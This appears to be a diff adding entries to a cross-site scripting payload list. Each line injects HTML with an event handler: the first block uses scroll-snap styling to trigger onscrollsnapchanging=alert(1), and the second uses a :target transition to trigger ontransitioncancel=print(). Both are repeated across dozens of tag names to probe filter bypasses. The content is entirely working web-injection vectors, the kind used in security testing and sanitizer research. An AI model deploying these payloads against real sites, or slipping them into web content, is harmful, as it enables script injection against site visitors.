+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <rb class="scroll-item">Item 1</rb><rb class="scroll-item">Item 2</rb></rb>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <rp class="scroll-item">Item 1</rp><rp class="scroll-item">Item 2</rp></rp>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <rt class="scroll-item">Item 1</rt><rt class="scroll-item">Item 2</rt></rt>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <rtc class="scroll-item">Item 1</rtc><rtc class="scroll-item">Item 2</rtc></rtc>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <ruby class="scroll-item">Item 1</ruby><ruby class="scroll-item">Item 2</ruby></ruby>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <s class="scroll-item">Item 1</s><s class="scroll-item">Item 2</s></s>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <samp class="scroll-item">Item 1</samp><samp class="scroll-item">Item 2</samp></samp>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <script class="scroll-item">Item 1</script><script class="scroll-item">Item 2</script></script>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <section class="scroll-item">Item 1</section><section class="scroll-item">Item 2</section></section>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <select class="scroll-item">Item 1</select><select class="scroll-item">Item 2</select></select>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <set class="scroll-item">Item 1</set><set class="scroll-item">Item 2</set></set>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <shadow class="scroll-item">Item 1</shadow><shadow class="scroll-item">Item 2</shadow></shadow>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <slot class="scroll-item">Item 1</slot><slot class="scroll-item">Item 2</slot></slot>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <small class="scroll-item">Item 1</small><small class="scroll-item">Item 2</small></small>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <source class="scroll-item">Item 1</source><source class="scroll-item">Item 2</source></source>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <spacer class="scroll-item">Item 1</spacer><spacer class="scroll-item">Item 2</spacer></spacer>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <span class="scroll-item">Item 1</span><span class="scroll-item">Item 2</span></span>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <strike class="scroll-item">Item 1</strike><strike class="scroll-item">Item 2</strike></strike>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <strong class="scroll-item">Item 1</strong><strong class="scroll-item">Item 2</strong></strong>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <style class="scroll-item">Item 1</style><style class="scroll-item">Item 2</style></style>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <sub class="scroll-item">Item 1</sub><sub class="scroll-item">Item 2</sub></sub>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <summary class="scroll-item">Item 1</summary><summary class="scroll-item">Item 2</summary></summary>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <sup class="scroll-item">Item 1</sup><sup class="scroll-item">Item 2</sup></sup>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <svg class="scroll-item">Item 1</svg><svg class="scroll-item">Item 2</svg></svg>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <table class="scroll-item">Item 1</table><table class="scroll-item">Item 2</table></table>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <tbody class="scroll-item">Item 1</tbody><tbody class="scroll-item">Item 2</tbody></tbody>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <td class="scroll-item">Item 1</td><td class="scroll-item">Item 2</td></td>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <template class="scroll-item">Item 1</template><template class="scroll-item">Item 2</template></template>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <textarea class="scroll-item">Item 1</textarea><textarea class="scroll-item">Item 2</textarea></textarea>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <tfoot class="scroll-item">Item 1</tfoot><tfoot class="scroll-item">Item 2</tfoot></tfoot>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <th class="scroll-item">Item 1</th><th class="scroll-item">Item 2</th></th>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <thead class="scroll-item">Item 1</thead><thead class="scroll-item">Item 2</thead></thead>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <time class="scroll-item">Item 1</time><time class="scroll-item">Item 2</time></time>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <title class="scroll-item">Item 1</title><title class="scroll-item">Item 2</title></title>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <tr class="scroll-item">Item 1</tr><tr class="scroll-item">Item 2</tr></tr>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <track class="scroll-item">Item 1</track><track class="scroll-item">Item 2</track></track>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <tt class="scroll-item">Item 1</tt><tt class="scroll-item">Item 2</tt></tt>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <u class="scroll-item">Item 1</u><u class="scroll-item">Item 2</u></u>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <ul class="scroll-item">Item 1</ul><ul class="scroll-item">Item 2</ul></ul>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <var class="scroll-item">Item 1</var><var class="scroll-item">Item 2</var></var>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <video class="scroll-item">Item 1</video><video class="scroll-item">Item 2</video></video>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <video2 class="scroll-item">Item 1</video2><video2 class="scroll-item">Item 2</video2></video2>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <wbr class="scroll-item">Item 1</wbr><wbr class="scroll-item">Item 2</wbr></wbr>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <xmp class="scroll-item">Item 1</xmp><xmp class="scroll-item">Item 2</xmp></xmp>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="alert(1)"> <xss class="scroll-item">Item 1</xss><xss class="scroll-item">Item 2</xss></xss>
+<style>:target {color: red;}</style><a id=x style="transition:color 10s" ontransitioncancel=print()></a>
+<style>:target {color: red;}</style><a2 id=x style="transition:color 10s" ontransitioncancel=print()></a2>
+<style>:target {color: red;}</style><abbr id=x style="transition:color 10s" ontransitioncancel=print()></abbr>
+<style>:target {color: red;}</style><acronym id=x style="transition:color 10s" ontransitioncancel=print()></acronym>
+<style>:target {color: red;}</style><address id=x style="transition:color 10s" ontransitioncancel=print()></address>
+<style>:target {color: red;}</style><animate id=x style="transition:color 10s" ontransitioncancel=print()></animate>
+<style>:target {color: red;}</style><animatemotion id=x style="transition:color 10s" ontransitioncancel=print()></animatemotion>
+<style>:target {color: red;}</style><animatetransform id=x style="transition:color 10s" ontransitioncancel=print()></animatetransform>
+<style>:target {color: red;}</style><applet id=x style="transition:color 10s" ontransitioncancel=print()></applet>
+<style>:target {color: red;}</style><area id=x style="transition:color 10s" ontransitioncancel=print()></area>
+<style>:target {color: red;}</style><article id=x style="transition:color 10s" ontransitioncancel=print()></article>
+<style>:target {color: red;}</style><aside id=x style="transition:color 10s" ontransitioncancel=print()></aside>
+<style>:target {color: red;}</style><audio id=x style="transition:color 10s" ontransitioncancel=print()></audio>
+<style>:target {color: red;}</style><audio2 id=x style="transition:color 10s" ontransitioncancel=print()></audio2>
+<style>:target {color: red;}</style><b id=x style="transition:color 10s" ontransitioncancel=print()></b>
+<style>:target {color: red;}</style><bdi id=x style="transition:color 10s" ontransitioncancel=print()></bdi>
+<style>:target {color: red;}</style><bdo id=x style="transition:color 10s" ontransitioncancel=print()></bdo>
+<style>:target {color: red;}</style><big id=x style="transition:color 10s" ontransitioncancel=print()></big>
+<style>:target {color: red;}</style><blink id=x style="transition:color 10s" ontransitioncancel=print()></blink>
+<style>:target {color: red;}</style><blockquote id=x style="transition:color 10s" ontransitioncancel=print()></blockquote>
+<style>:target {color: red;}</style><body id=x style="transition:color 10s" ontransitioncancel=print()></body>
+<style>:target {color: red;}</style><br id=x style="transition:color 10s" ontransitioncancel=print()></br>
+<style>:target {color: red;}</style><button id=x style="transition:color 10s" ontransitioncancel=print()></button>
+<style>:target {color: red;}</style><canvas id=x style="transition:color 10s" ontransitioncancel=print()></canvas>
+<style>:target {color: red;}</style><caption id=x style="transition:color 10s" ontransitioncancel=print()></caption>
+<style>:target {color: red;}</style><center id=x style="transition:color 10s" ontransitioncancel=print()></center>
+<style>:target {color: red;}</style><cite id=x style="transition:color 10s" ontransitioncancel=print()></cite>
+<style>:target {color: red;}</style><code id=x style="transition:color 10s" ontransitioncancel=print()></code>
+<style>:target {color: red;}</style><col id=x style="transition:color 10s" ontransitioncancel=print()></col>
+<style>:target {color: red;}</style><colgroup id=x style="transition:color 10s" ontransitioncancel=print()></colgroup>
+<style>:target {color: red;}</style><command id=x style="transition:color 10s" ontransitioncancel=print()></command>
+<style>:target {color: red;}</style><content id=x style="transition:color 10s" ontransitioncancel=print()></content>
+<style>:target {color: red;}</style><data id=x style="transition:color 10s" ontransitioncancel=print()></data>
+<style>:target {color: red;}</style><datalist id=x style="transition:color 10s" ontransitioncancel=print()></datalist>
+<style>:target {color: red;}</style><dd id=x style="transition:color 10s" ontransitioncancel=print()></dd>
+<style>:target {color: red;}</style><del id=x style="transition:color 10s" ontransitioncancel=print()></del>
+<style>:target {color: red;}</style><details id=x style="transition:color 10s" ontransitioncancel=print()></details>
+<style>:target {color: red;}</style><dfn id=x style="transition:color 10s" ontransitioncancel=print()></dfn>
+<style>:target {color: red;}</style><dialog id=x style="transition:color 10s" ontransitioncancel=print()></dialog>
+<style>:target {color: red;}</style><dir id=x style="transition:color 10s" ontransitioncancel=print()></dir>
+<style>:target {color: red;}</style><div id=x style="transition:color 10s" ontransitioncancel=print()></div>
+<style>:target {color: red;}</style><dl id=x style="transition:color 10s" ontransitioncancel=print()></dl>
+<style>:target {color: red;}</style><dt id=x style="transition:color 10s" ontransitioncancel=print()></dt>
+<style>:target {color: red;}</style><element id=x style="transition:color 10s" ontransitioncancel=print()></element>
+<style>:target {color: red;}</style><em id=x style="transition:color 10s" ontransitioncancel=print()></em>
+<style>:target {color: red;}</style><embed id=x style="transition:color 10s" ontransitioncancel=print()></embed>
+<style>:target {color: red;}</style><fieldset id=x style="transition:color 10s" ontransitioncancel=print()></fieldset>
+<style>:target {color: red;}</style><figcaption id=x style="transition:color 10s" ontransitioncancel=print()></figcaption>
+<style>:target {color: red;}</style><figure id=x style="transition:color 10s" ontransitioncancel=print()></figure>
+<style>:target {color: red;}</style><font id=x style="transition:color 10s" ontransitioncancel=print()></font>
+<style>:target {color: red;}</style><footer id=x style="transition:color 10s" ontransitioncancel=print()></footer>
+<style>:target {color: red;}</style><form id=x style="transition:color 10s" ontransitioncancel=print()></form>
+<style>:target {color: red;}</style><frame id=x style="transition:color 10s" ontransitioncancel=print()></frame>
+<style>:target {color: red;}</style><frameset id=x style="transition:color 10s" ontransitioncancel=print()></frameset>
+<style>:target {color: red;}</style><geolocation id=x style="transition:color 10s" ontransitioncancel=print()></geolocation>
+<style>:target {color: red;}</style><h1 id=x style="transition:color 10s" ontransitioncancel=print()></h1>
+<style>:target {color: red;}</style><head id=x style="transition:color 10s" ontransitioncancel=print()></head>
+<style>:target {color: red;}</style><header id=x style="transition:color 10s" ontransitioncancel=print()></header>
+<style>:target {color: red;}</style><hgroup id=x style="transition:color 10s" ontransitioncancel=print()></hgroup>
+<style>:target {color: red;}</style><hr id=x style="transition:color 10s" ontransitioncancel=print()></hr>
+<style>:target {color: red;}</style><html id=x style="transition:color 10s" ontransitioncancel=print()></html>
+<style>:target {color: red;}</style><i id=x style="transition:color 10s" ontransitioncancel=print()></i>
+<style>:target {color: red;}</style><iframe id=x style="transition:color 10s" ontransitioncancel=print()></iframe>
+<style>:target {color: red;}</style><iframe2 id=x style="transition:color 10s" ontransitioncancel=print()></iframe2>
+<style>:target {color: red;}</style><image id=x style="transition:color 10s" ontransitioncancel=print()></image>
+<style>:target {color: red;}</style><image2 id=x style="transition:color 10s" ontransitioncancel=print()></image2>
+<style>:target {color: red;}</style><image3 id=x style="transition:color 10s" ontransitioncancel=print()></image3>
+<style>:target {color: red;}</style><img id=x style="transition:color 10s" ontransitioncancel=print()></img>
+<style>:target {color: red;}</style><img2 id=x style="transition:color 10s" ontransitioncancel=print()></img2>
+<style>:target {color: red;}</style><input id=x style="transition:color 10s" ontransitioncancel=print()></input>
+<style>:target {color: red;}</style><input2 id=x style="transition:color 10s" ontransitioncancel=print()></input2>
+<style>:target {color: red;}</style><input3 id=x style="transition:color 10s" ontransitioncancel=print()></input3>
+<style>:target {color: red;}</style><input4 id=x style="transition:color 10s" ontransitioncancel=print()></input4>
+<style>:target {color: red;}</style><ins id=x style="transition:color 10s" ontransitioncancel=print()></ins>
+<style>:target {color: red;}</style><kbd id=x style="transition:color 10s" ontransitioncancel=print()></kbd>
+<style>:target {color: red;}</style><keygen id=x style="transition:color 10s" ontransitioncancel=print()></keygen>
+<style>:target {color: red;}</style><label id=x style="transition:color 10s" ontransitioncancel=print()></label>
+<style>:target {color: red;}</style><legend id=x style="transition:color 10s" ontransitioncancel=print()></legend>
+<style>:target {color: red;}</style><li id=x style="transition:color 10s" ontransitioncancel=print()></li>
+<style>:target {color: red;}</style><link id=x style="transition:color 10s" ontransitioncancel=print()></link>
+<style>:target {color: red;}</style><listing id=x style="transition:color 10s" ontransitioncancel=print()></listing>
+<style>:target {color: red;}</style><main id=x style="transition:color 10s" ontransitioncancel=print()></main>
+<style>:target {color: red;}</style><map id=x style="transition:color 10s" ontransitioncancel=print()></map>
+<style>:target {color: red;}</style><mark id=x style="transition:color 10s" ontransitioncancel=print()></mark>
+<style>:target {color: red;}</style><marquee id=x style="transition:color 10s" ontransitioncancel=print()></marquee>
+<style>:target {color: red;}</style><menu id=x style="transition:color 10s" ontransitioncancel=print()></menu>
+<style>:target {color: red;}</style><menuitem id=x style="transition:color 10s" ontransitioncancel=print()></menuitem>
+<style>:target {color: red;}</style><meta id=x style="transition:color 10s" ontransitioncancel=print()></meta>
+<style>:target {color: red;}</style><meter id=x style="transition:color 10s" ontransitioncancel=print()></meter>
+<style>:target {color: red;}</style><multicol id=x style="transition:color 10s" ontransitioncancel=print()></multicol>
+<style>:target {color: red;}</style><nav id=x style="transition:color 10s" ontransitioncancel=print()></nav>
+<style>:target {color: red;}</style><nextid id=x style="transition:color 10s" ontransitioncancel=print()></nextid>
+<style>:target {color: red;}</style><nobr id=x style="transition:color 10s" ontransitioncancel=print()></nobr>
+<style>:target {color: red;}</style><noembed id=x style="transition:color 10s" ontransitioncancel=print()></noembed>
+<style>:target {color: red;}</style><noframes id=x style="transition:color 10s" ontransitioncancel=print()></noframes>
+<style>:target {color: red;}</style><noscript id=x style="transition:color 10s" ontransitioncancel=print()></noscript>
+<style>:target {color: red;}</style><object id=x style="transition:color 10s" ontransitioncancel=print()></object>
+<style>:target {color: red;}</style><ol id=x style="transition:color 10s" ontransitioncancel=print()></ol>
+<style>:target {color: red;}</style><optgroup id=x style="transition:color 10s" ontransitioncancel=print()></optgroup>
+<style>:target {color: red;}</style><option id=x style="transition:color 10s" ontransitioncancel=print()></option>
+<style>:target {color: red;}</style><output id=x style="transition:color 10s" ontransitioncancel=print()></output>
+<style>:target {color: red;}</style><p id=x style="transition:color 10s" ontransitioncancel=print()></p>
+<style>:target {color: red;}</style><param id=x style="transition:color 10s" ontransitioncancel=print()></param>
+<style>:target {color: red;}</style><picture id=x style="transition:color 10s" ontransitioncancel=print()></picture>
+<style>:target {color: red;}</style><plaintext id=x style="transition:color 10s" ontransitioncancel=print()></plaintext>
+<style>:target {color: red;}</style><pre id=x style="transition:color 10s" ontransitioncancel=print()></pre>
+<style>:target {color: red;}</style><progress id=x style="transition:color 10s" ontransitioncancel=print()></progress>
+<style>:target {color: red;}</style><q id=x style="transition:color 10s" ontransitioncancel=print()></q>
+<style>:target {color: red;}</style><rb id=x style="transition:color 10s" ontransitioncancel=print()></rb>
+<style>:target {color: red;}</style><rp id=x style="transition:color 10s" ontransitioncancel=print()></rp>
+<style>:target {color: red;}</style><rt id=x style="transition:color 10s" ontransitioncancel=print()></rt>
+<style>:target {color: red;}</style><rtc id=x style="transition:color 10s" ontransitioncancel=print()></rtc>
+<style>:target {color: red;}</style><ruby id=x style="transition:color 10s" ontransitioncancel=print()></ruby>
+<style>:target {color: red;}</style><s id=x style="transition:color 10s" ontransitioncancel=print()></s>
+<style>:target {color: red;}</style><samp id=x style="transition:color 10s" ontransitioncancel=print()></samp>
+<style>:target {color: red;}</style><script id=x style="transition:color 10s" ontransitioncancel=print()></script>
+<style>:target {color: red;}</style><section id=x style="transition:color 10s" ontransitioncancel=print()></section>
+<style>:target {color: red;}</style><select id=x style="transition:color 10s" ontransitioncancel=print()></select>
+<style>:target {color: red;}</style><set id=x style="transition:color 10s" ontransitioncancel=print()></set>
+<style>:target {color: red;}</style><shadow id=x style="transition:color 10s" ontransitioncancel=print()></shadow>
+<style>:target {color: red;}</style><slot id=x style="transition:color 10s" ontransitioncancel=print()></slot>
+<style>:target {color: red;}</style><small id=x style="transition:color 10s" ontransitioncancel=print()></small>
+<style>:target {color: red;}</style><source id=x style="transition:color 10s" ontransitioncancel=print()></source>
+<style>:target {color: red;}</style><spacer id=x style="transition:color 10s" ontransitioncancel=print()></spacer>
+<style>:target {color: red;}</style><span id=x style="transition:color 10s" ontransitioncancel=print()></span>
+<style>:target {color: red;}</style><strike id=x style="transition:color 10s" ontransitioncancel=print()></strike>
+<style>:target {color: red;}</style><strong id=x style="transition:color 10s" ontransitioncancel=print()></strong>
